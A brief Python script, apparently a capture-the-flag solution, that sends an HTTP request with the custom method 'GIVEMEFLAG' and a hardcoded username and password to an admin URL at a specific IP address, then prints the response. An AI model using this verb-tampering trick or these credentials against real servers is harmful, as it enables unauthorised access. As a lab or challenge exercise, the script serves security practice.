import requests

login_url = 'http://140.115.59.7:12002/admin'

login_data = {
    'username': 'hitori',
    'password': 'rockyou!!!'
}

response = requests.request("GIVEMEFLAG", login_url, data=login_data)

print(response.text)

